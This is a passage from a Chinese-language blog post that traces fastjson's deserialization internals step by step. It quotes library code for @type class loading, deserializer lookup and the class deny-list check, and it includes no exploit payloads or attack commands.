</code>、<code>\r</code>、<code>\n</code>、<code>\t</code>、<code>\f</code>、<code>\b</code>，如果等于<code>/</code>；循环判断是否为<code>/</code>、<code>*</code>、<code>\n</code></p><div align=center><img src="/img/fastjson序列化和反序列化/10.png" alt="10" style="zoom:50%;" /></div>如图会取Key值，即`""`中的字符，如`@type`<div align=center><img src="/img/fastjson序列化和反序列化/10.png" alt="10" style="zoom:50%;" /></div>继续向下，判断Key是否为@type后，以"为单位获取对应的`Class`，ClassLoader为`this.config.getDefaultClassLoader`，此时为null<div align=center><img src="/img/fastjson序列化和反序列化/12.png" alt="12" style="zoom:50%;" /></div><h4 id="2-2-1-type类加载"><a href="#2-2-1-type类加载" class="headerlink" title="2.2.1 @type类加载"></a>2.2.1 @type类加载</h4><p>这里首先通过mapping去直接获取Class，如果不是这些开头的key，则继续运行</p><div align=center><img src="/img/fastjson序列化和反序列化/13.png" alt="13" style="zoom:50%;" /></div>如代码分析，有几个判断条件，首先判断第一个字符是否为`[`，其次判断是否为`L`且结束为`;`<ul><li>为<code>[</code>时，通过<code>loadClass</code>加载<code>[</code>后的字符，并返回<code>Array</code>动态数组</li><li><code>L</code>开头时，去中间字符串类名，再次调用<code>loadClass</code>进行加载</li></ul><p>接下来判断ClassLoader是否为空</p><ul><li><p>如果为空则取<code>Thread.currentThread().getContextClassLoader()</code>；</p></li><li><p>如果取<code>Class</code>失败，直接通过<code>Class.forName</code>获取类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">if</span> (className != <span class="keyword">null</span> &amp;&amp; className.length() != <span class="number">0</span>) &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = (Class)mappings.get(className);</span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">            <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">            String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (classLoader != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    clazz = classLoader.loadClass(className);</span><br><span class="line">                    mappings.put(className, clazz);</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var6) &#123;</span><br><span class="line">                var6.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">                <span class="keyword">if</span> (contextClassLoader != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    clazz = contextClassLoader.loadClass(className);</span><br><span class="line">                    mappings.put(className, clazz);</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var5) &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                clazz = Class.forName(className);</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var4) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-2-类加载成功后"><a href="#2-2-2-类加载成功后" class="headerlink" title="2.2.2 类加载成功后"></a>2.2.2 类加载成功后</h4><p>这里会执行<code>nextToken</code>，先看看<code>nextToken</code>是什么，如果<code>token=13</code>，则进入一段执行代码，通过查看<code>nextToken</code>中代码，发现<code>ch=&#125;</code>时会导致<code>token=13</code></p></li><li><p>这里先跳过他，如果是<code>&#125;</code>的话，大概逻辑也就是实例化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (lexer.token() == <span class="number">13</span>) &#123;</span><br><span class="line">    lexer.nextToken(<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        instance = <span class="keyword">null</span>;</span><br><span class="line">        ObjectDeserializer deserializer = <span class="keyword">this</span>.config.getDeserializer(clazz);</span><br><span class="line">        <span class="keyword">if</span> (deserializer <span class="keyword">instanceof</span> JavaBeanDeserializer) &#123;</span><br><span class="line">            instance = ((JavaBeanDeserializer)deserializer).createInstance(<span class="keyword">this</span>, clazz);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz == Cloneable.class) &#123;</span><br><span class="line">                instance = <span class="keyword">new</span> HashMap();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;java.util.Collections$EmptyMap&quot;</span>.equals(ref)) &#123;</span><br><span class="line">                instance = Collections.emptyMap();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                instance = clazz.newInstance();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        obj = instance;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var23) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;create instance error&quot;</span>, var23);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div align=center><img src="/img/fastjson序列化和反序列化/14.png" alt="14" style="zoom:50%;" /></div></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ObjectDeserializer deserializer = <span class="keyword">this</span>.config.getDeserializer(clazz);</span><br></pre></td></tr></table></figure><p>查看这个方法，判断<code>type</code>是否是<code>Class</code>类型、<code>ParameterizedType</code>类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ObjectDeserializer <span class="title">getDeserializer</span><span class="params">(Type type)</span> </span>&#123;</span><br><span class="line">    ObjectDeserializer derializer = (ObjectDeserializer)<span class="keyword">this</span>.derializers.get(type);</span><br><span class="line">    <span class="keyword">if</span> (derializer != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> derializer;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getDeserializer((Class)type, type);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type <span class="keyword">instanceof</span> ParameterizedType) &#123;</span><br><span class="line">        Type rawType = ((ParameterizedType)type).getRawType();</span><br><span class="line">        <span class="keyword">return</span> rawType <span class="keyword">instanceof</span> Class ? <span class="keyword">this</span>.getDeserializer((Class)rawType, type) : <span class="keyword">this</span>.getDeserializer(rawType);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> JavaObjectDeserializer.instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-3-获取反序列化工具类"><a href="#2-2-3-获取反序列化工具类" class="headerlink" title="2.2.3 获取反序列化工具类"></a>2.2.3 获取反序列化工具类</h4><p>getDeserializer方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ObjectDeserializer <span class="title">getDeserializer</span><span class="params">(Class&lt;?&gt; clazz, Type type)</span> </span>&#123;</span><br><span class="line">    ObjectDeserializer derializer = (ObjectDeserializer)<span class="keyword">this</span>.derializers.get(type);</span><br><span class="line">    <span class="keyword">if</span> (derializer != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> derializer;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (type == <span class="keyword">null</span>) &#123;</span><br><span class="line">            type = clazz;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ObjectDeserializer derializer = (ObjectDeserializer)<span class="keyword">this</span>.derializers.get(type);</span><br><span class="line">        <span class="keyword">if</span> (derializer != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (ObjectDeserializer)derializer;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            JSONType annotation = (JSONType)clazz.getAnnotation(JSONType.class);</span><br><span class="line">            <span class="keyword">if</span> (annotation != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Class&lt;?&gt; mappingTo = annotation.mappingTo();</span><br><span class="line">                <span class="keyword">if</span> (mappingTo != Void.class) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">this</span>.getDeserializer(mappingTo, mappingTo);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (type <span class="keyword">instanceof</span> WildcardType || type <span class="keyword">instanceof</span> TypeVariable || type <span class="keyword">instanceof</span> ParameterizedType) &#123;</span><br><span class="line">                derializer = (ObjectDeserializer)<span class="keyword">this</span>.derializers.get(clazz);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (derializer != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> (ObjectDeserializer)derializer;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                String className = clazz.getName();</span><br><span class="line">                className = className.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.denyList.length; ++i) &#123;</span><br><span class="line">                    String deny = <span class="keyword">this</span>.denyList[i];</span><br><span class="line">                    <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;parser deny : &quot;</span> + className);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;java.awt.&quot;</span>) &amp;&amp; AwtCodec.support(clazz) &amp;&amp; !awtError) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.awt.Point&quot;</span>), AwtCodec.instance);</span><br><span class="line">                        <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.awt.Font&quot;</span>), AwtCodec.instance);</span><br><span class="line">                        <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.awt.Rectangle&quot;</span>), AwtCodec.instance);</span><br><span class="line">                        <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.awt.Color&quot;</span>), AwtCodec.instance);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable var11) &#123;</span><br><span class="line">                        awtError = <span class="keyword">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    derializer = AwtCodec.instance;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!jdk8Error) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;java.time.&quot;</span>)) &#123;</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.time.LocalDateTime&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.time.LocalDate&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.time.LocalTime&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.time.ZonedDateTime&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.time.OffsetDateTime&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.time.OffsetTime&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.time.ZoneOffset&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.time.ZoneRegion&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.time.ZoneId&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.time.Period&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.time.Duration&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.time.Instant&quot;</span>), Jdk8DateCodec.instance);</span><br><span class="line">                            derializer = (ObjectDeserializer)<span class="keyword">this</span>.derializers.get(clazz);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;java.util.Optional&quot;</span>)) &#123;</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.util.Optional&quot;</span>), OptionalCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.util.OptionalDouble&quot;</span>), OptionalCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.util.OptionalInt&quot;</span>), OptionalCodec.instance);</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(Class.forName(<span class="string">&quot;java.util.OptionalLong&quot;</span>), OptionalCodec.instance);</span><br><span class="line">                            derializer = (ObjectDeserializer)<span class="keyword">this</span>.derializers.get(clazz);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable var10) &#123;</span><br><span class="line">                        jdk8Error = <span class="keyword">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (className.equals(<span class="string">&quot;java.nio.file.Path&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.derializers.put(clazz, MiscCodec.instance);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (clazz == Entry.class) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.derializers.put(clazz, MiscCodec.instance);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                ClassLoader classLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Iterator var17 = ServiceLoader.load(AutowiredObjectDeserializer.class, classLoader).iterator();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span>(var17.hasNext()) &#123;</span><br><span class="line">                        AutowiredObjectDeserializer autowired = (AutowiredObjectDeserializer)var17.next();</span><br><span class="line">                        Iterator var8 = autowired.getAutowiredFor().iterator();</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">while</span>(var8.hasNext()) &#123;</span><br><span class="line">                            Type forType = (Type)var8.next();</span><br><span class="line">                            <span class="keyword">this</span>.derializers.put(forType, autowired);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var12) &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (derializer == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    derializer = (ObjectDeserializer)<span class="keyword">this</span>.derializers.get(type);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (derializer != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> (ObjectDeserializer)derializer;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (clazz.isEnum()) &#123;</span><br><span class="line">                        derializer = <span class="keyword">new</span> EnumDeserializer(clazz);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz.isArray()) &#123;</span><br><span class="line">                        derializer = ObjectArrayCodec.instance;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz != Set.class &amp;&amp; clazz != HashSet.class &amp;&amp; clazz != Collection.class &amp;&amp; clazz != List.class &amp;&amp; clazz != ArrayList.class) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (Collection.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                            derializer = CollectionCodec.instance;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                            derializer = MapDeserializer.instance;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Throwable.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                            derializer = <span class="keyword">new</span> ThrowableDeserializer(<span class="keyword">this</span>, clazz);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            derializer = <span class="keyword">this</span>.createJavaBeanDeserializer(clazz, (Type)type);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        derializer = CollectionCodec.instance;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">this</span>.putDeserializer((Type)type, (ObjectDeserializer)derializer);</span><br><span class="line">                    <span class="keyword">return</span> (ObjectDeserializer)derializer;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>首先通过<code>JSONType annotation = (JSONType)clazz.getAnnotation(JSONType.class);</code>判断并获取类中注解</p></li><li><p>替换<code>className</code>中的<code>$</code>为<code>.</code></p><h5 id="2-2-3-1-类加载黑名单"><a href="#2-2-3-1-类加载黑名单" class="headerlink" title="2.2.3.1 类加载黑名单"></a>2.2.3.1 类加载黑名单</h5></li><li><p>判断是否为denyList，此时列表中只有两个线程类名</p></li><li><p>判断是否以java.awt.开头，<code>java.awt.Point、java.awt.Font、java.awt.Rectangle、java.awt.Color</code></p></li></ul><div align=center><img src="/img/fastjson序列化和反序列化/15.png" alt="15" style="zoom:50%;" /></div><ul><li>放入指定的java.time.* 和java.util.Optional*</li></ul><div align=center><img src="/img/fastjson序列化和反序列化/16.png" alt="16" style="zoom:50%;" /></div><ul><li>判断是否为<code>java.nio.file.Path</code></li><li>判断是否为<code>java.util.Entry</code></li><li>针对clazz做了一些类型的判断后，<code>derializer = this.createJavaBeanDeserializer(clazz, (Type)type);</code></li></ul><div align=center><img src="/img/fastjson序列化和反序列化/17.png" alt="17" style="zoom:50%;" /></div><ul><li><code>createJavaBeanDeserializer</code><ul><li>获取superClass，如果没有<code>superClass=clazz</code>，判断类的方法修饰符是否为<code>Public</code></li><li>判断clazz.getTypeParameters().length是否为0，如果底层泛型声明没有声明类型变量，则为0</li><li><code>ASMUtils.checkName(clazz.getSimpleName())</code>检查类名</li><li>判断<code>clazz</code>是否是接口</li><li><code>com.alibaba.fastjson.util.JavaBeanInfo.build</code>创建<code>beanInfo</code>，其中初始化创建对象时，获取了<code>clazz</code>的<code>Fields</code>、<code>Methods</code>、<code>Constructor</code><ul><li>判断默认的构造方法是否为空，类不是接口，修饰符不是抽象的</li><li>判断<code>builderClass</code>是否为空</li><li>遍历所有的<code>Method</code></li></ul></li></ul></li></ul><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TypeVariable[] tValue = List.class.getTypeParameters();</span><br><span class="line">System.out.println(tValue[<span class="number">0</span>].getName());</span><br><span class="line"><span class="comment">//输出为E</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ObjectDeserializer <span class="title">createJavaBeanDeserializer</span><span class="params">(Class&lt;?&gt; clazz, Type type)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> asmEnable = <span 